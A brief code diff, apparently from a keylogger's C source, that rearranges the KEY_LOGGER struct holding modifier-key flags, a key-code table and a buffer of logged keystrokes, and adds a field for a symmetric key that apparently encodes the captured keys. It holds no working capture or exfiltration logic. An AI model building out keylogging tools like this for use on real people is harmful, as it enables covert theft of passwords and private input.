@@ -13,7 +13,6 @@
 #define ZERO 0x30 // key code for 0
 #define NINE 0x39
 
-
 /**
  * structure to maintain state for the keys shift, caps lock,
  * and num pad keys
@@ -21,13 +20,16 @@
  * keys that are to be logged
  */
 typedef struct {
-    BOOL shift;
-    BOOL capsLock;
-    BOOL numPad;
     KEY_PAIR* keyCodes[NUM_KEYS]; // array of KEY_PAIRS corresponding to their vkCodes
+
+    BOOL shift;    // boolean shift pressed flag
+    BOOL capsLock; // caps lock active flag
+    BOOL numPad;   // num pad active flag
     
-    unsigned int bufferPtr;  // current pointer in the keyBuffer
     char keyBuffer[MAX_BUFF_LEN]; // logged key buffer
+    unsigned int bufferPtr;  // current pointer in the keyBuffer
+    
+    unsigned char encKey; // the symmetric encoding key!
 } KEY_LOGGER;
 
 
